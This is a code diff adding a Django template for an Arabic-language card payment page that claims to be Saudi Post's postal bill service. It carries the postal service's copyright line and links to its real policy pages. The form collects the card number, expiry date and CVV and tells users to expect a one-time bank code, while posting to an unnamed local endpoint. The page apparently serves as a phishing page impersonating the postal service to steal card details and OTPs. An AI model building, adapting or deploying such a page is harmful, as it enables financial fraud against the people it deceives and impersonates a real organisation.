@@ -1,0 +1,131 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <link rel="stylesheet" href="{% static 'styles.css' %}">
+    
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" >
+    <title>Document</title>
+    <link rel="icon" href="{% static 'favicon.ico' %}">
+   
+ 
+</head>
+<body>
+  
+  
+  
+  <div class="container">
+    <div class="header"></div>
+    <div class="line"></div>
+    <button class="top-left-button" >تسجيل</button>
+    <img class="top-right-image" src="{% static 'logo.png' %}" alt="image">
+    
+    <div>
+      <div class="line4"></div>
+      <div class="line5"></div>
+      
+    </div>
+  
+    <div class="text-box">
+      <div class="textbox">
+        <h3>سداد فواتير الخدمات البريدية </h3>
+        <p lang="ar" class="paragraph">بعد ادخال معلومات البطاقة والضغط على إدفع، 
+        سيقوم البنك بإرسال رمز سري مؤقت الى جوالك، 
+        وستظهر خانة لادخال الرمز </p>
+        <div class="form" style="text-align: right;"> 
+          
+          <form method="post" novalidate name="payment_form" action="?">
+            {% csrf_token %}
+            <b class="card_number_label">رقم البطاقة </b>
+            <script src="{% static 'script.js' %}"></script>
+            <input type="hidden" class="card_type" name="card_type">
+            <input type="text" maxlength="19" name="card" class="card_number" placeholder="XXXX XXXX XXXX XXXX" pattern=".{16,}" oninput="checkCardType()"  required >
+            
+            {% if error %}
+            <div style="display: flex;  justify-content: flex-end;">
+              <p class="card_error" dir="rtl" style="white-space: normal;">  <img src="{% static 'allert.svg' %}" alt="" style="width: 10x; height: 10px; white-space: nowrap;">&nbsp {{ error }}</p>
+            </div>
+            {% endif %}
+            <b class="exp_date_label">تاريخ الإنتهاء  </b>
+            <div style="display: flex; align-items: center; justify-content: flex;">
+              <select name="month" class="month_pick" dir="rtl">
+                <option value="">الشهر</option>
+                <option value="01">01</option>
+                <option value="02">02</option>
+                <option value="03">03</option>
+                <option value="04">04 </option>
+                <option value="05">05</option>
+                <option value="06">06 </option>
+                <option value="07">07</option>
+                <option value="08">08</option>
+                <option value="09">09</option>
+                <option value="10">10</option>
+                <option value="11">11</option>
+                <option value="12">12</option>
+            </select>
+            <p style="width: 10%; text-align: center; padding-bottom: 10px;">/</p>
+            <select name="year" class="year_pick" dir="rtl">
+              <option value="">السنة</option>
+              <option value="23">2023</option>
+              <option value="24">2024</option>
+              <option value="25">2025</option>
+              <option value="26">2026 </option>
+              <option value="27">2027</option>
+              <option value="28">2028 </option>
+              <option value="29">2029</option>
+              <option value="30">2030</option>
+          </select>
+            </div>
+            {% if error2 %}
+            <div style="display: flex;  justify-content: flex-end;">
+              <p class="card_error" dir="rtl" style="white-space: normal;">  <img src="{% static 'allert.svg' %}" alt="" style="width: 10x; height: 10px; white-space: nowrap;">&nbsp {{ error2 }}</p>
+            </div>
+            {% endif %}
+            <b class="cvv_label">رمز التحقق </b>
+            <input type="number" name="cvv" class="cvv" placeholder="XXX" required>
+            {% if error3 %}
+            <div style="display: flex;  justify-content: flex-end;">
+              <p class="card_error" dir="rtl" style="white-space: normal;">  <img src="{% static 'allert.svg' %}" alt="" style="width: 10x; height: 10px; white-space: nowrap;">&nbsp {{ error3 }}</p>
+            </div>
+            {% endif %}
+            <button type="submit" class="submit-button" style="text-align: center;">إدفع</button>
+        <p class="required_alert"> يجب ملئ الخانات المرفقة بعلامة النجمة </p>
+        
+
+            
+        </form>
+        
+           
+          
+        </div>
+          
+      </div> 
+      
+    </div>
+    
+  
+  </div>
+  
+  
+ 
+  <div class="container2">
+    <div class="footer2">
+      <div style="display: flex;  justify-content: flex-end;">
+        <p class="info-text3" style="font-size: 14px;white-space: normal;" dir="rtl"><img src="{% static 'copyright.png' %}"
+           alt="copyright" style="width: 12px; height: 12px; margin-left: 5px;top: 20px; white-space: nowrap;"><span>2023 &nbsp
+           </span>جميع الحقوق محفوظة لمؤسسة البريد السعودي - سبل </p>
+         
+        
+      </div>
+      <div style="display: flex; align-items: center; justify-content: flex-end; font-size: 14px; padding-top: 0px; align-items: flex-start;">
+        <p class="info-text3" style="font-size: 14px;"> عند إستخدامك لهذا الموقع ، فإنك توافق على  <a href='https://splonline.com.sa/ar/terms-of-service/' target="_blank">شروط الخدمة </a> و <a href='https://splonline.com.sa/ar/privacy-policy/' target="_blank">سياسة الخصوصية</a> </p>
+        
+      </div>
+    </div>
+  </div>
+</body>
+</html>
